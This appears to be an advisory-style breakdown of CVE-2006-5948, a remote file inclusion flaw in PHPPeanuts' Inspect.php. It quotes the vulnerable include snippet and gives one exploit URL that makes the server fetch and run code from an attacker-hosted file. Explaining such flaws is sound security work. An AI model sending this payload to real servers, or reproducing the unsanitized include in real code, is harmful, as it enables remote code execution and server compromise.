Based on the provided content, here's a breakdown of the vulnerability:

**CVE ID:** CVE-2006-5948

**Root Cause of Vulnerability:**
The vulnerability stems from a lack of proper input validation in the `Inspect.php` file of PHPPeanuts 1.3 Beta. Specifically, the `Include` parameter within the HTTP request is directly used in an `include` statement without any prior sanitization or verification.

**Weaknesses/Vulnerabilities Present:**
- **Remote File Inclusion (RFI):**  The primary weakness is that the application directly includes a file path provided by the user via the `Include` parameter. Because there is no sanitization, an attacker can provide a URL pointing to a malicious file on a remote server, which will then be executed by the PHP application.

**Impact of Exploitation:**
- **Arbitrary Code Execution:** By including a malicious PHP file from a remote server, the attacker can execute arbitrary code on the vulnerable server, potentially leading to complete system compromise, data theft, or defacement.
- **Server takeover:** An attacker could gain control of the web server.

**Attack Vectors:**
- **HTTP Request:** The attacker crafts a malicious HTTP GET request to the vulnerable `Inspect.php` script, including a URL to a malicious PHP file in the `Include` parameter.

**Required Attacker Capabilities/Position:**
- The attacker needs to be able to send HTTP requests to the vulnerable server.
- The attacker needs to have a web server or file hosting service where they can place the malicious PHP code.

**Technical Details:**
The vulnerability is located in `Inspect.php` at these lines:
```php
if ( isSet($_REQUEST["Include"]) )
    include $_REQUEST["Include"];
```
This code snippet directly uses the value of the `Include` parameter from the HTTP request in a PHP `include` statement.

**Exploit Example:**
An example of an exploit given is:
`http://site/[phppeanuts_path]/pntUnit/Inspect.php?Include=http://yoursite/evil_code.txt`

The `[phppeanuts_path]` represents the location where the PHPPeanuts application is installed, and `http://yoursite/evil_code.txt` represents a malicious PHP file hosted by the attacker.
